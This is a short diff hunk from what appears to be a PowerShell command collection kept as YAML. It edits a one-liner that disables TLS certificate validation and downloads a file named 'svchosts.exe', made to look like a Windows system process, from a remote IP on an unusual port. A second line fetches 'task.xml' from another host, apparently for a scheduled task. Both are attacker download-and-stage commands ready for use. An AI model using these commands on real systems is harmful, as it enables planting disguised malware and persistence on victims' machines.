@@ -5,7 +5,7 @@ functions:
       code: |
         +++++++++++POWERSHELL+++++++++++
 
-        powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://68.183.217.18:56789/svchosts.exe','svchosts.exe')"
+        powershell -c "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};(New-Object System.Net.WebClient).DownloadFile('https://192.168.1.1:56789/svchosts.exe','svchosts.exe')"
 
         powershell -c iwr -Uri http://192.168.119.149:8000/task.xml -OutFile task.xml -usebasicparsing
 
